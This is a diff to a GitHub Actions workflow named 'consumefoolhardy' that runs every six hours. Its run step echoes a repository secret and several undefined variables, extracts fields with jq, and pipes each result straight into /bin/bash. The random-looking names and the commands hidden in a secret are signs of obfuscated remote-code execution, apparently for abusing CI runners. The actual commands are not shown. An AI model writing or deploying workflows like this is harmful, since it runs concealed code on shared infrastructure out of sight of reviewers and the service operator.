@@ -1,11 +1,9 @@
 name: consumefoolhardy
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 3/6 * * *'
-
-jobs:  # 19725
+    - cron: '10 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,12 +11,13 @@ jobs:  # 19725
       - uses: actions/checkout@v4
       - name: consumefoolhardy
         env:
-          bi9299: ${{ secrets.bi9299 }}
+          n9: ${{ secrets.n9 }}
         run: |
-          echo $bi9299 | jq -r .gl09 | /bin/bash
-          echo $qyol36487 | jq -r .egnrr6 | /bin/bash
-          echo $bpy06301 | jq -r .vuk90993 | /bin/bash
-          echo $x4 | jq -r .pcpq3824 | /bin/bash
-          echo $o195 | jq -r .zzk351 | /bin/bash
-          echo $s9 | jq -r .uaz44834 | /bin/bash
+          echo $n9 | jq -r .nciea7 | /bin/bash
+          echo $yxg68951 | jq -r .rw293 | /bin/bash
+          echo $eoml4 | jq -r .tmgas795 | /bin/bash
+          echo $t100 | jq -r .i6 | /bin/bash
+          echo $gcxbh34 | jq -r .lmlk4522 | /bin/bash
+          echo $ndb07015 | jq -r .sh0617 | /bin/bash
+          echo $ikgqx7 | jq -r .mnc0 | /bin/bash
 
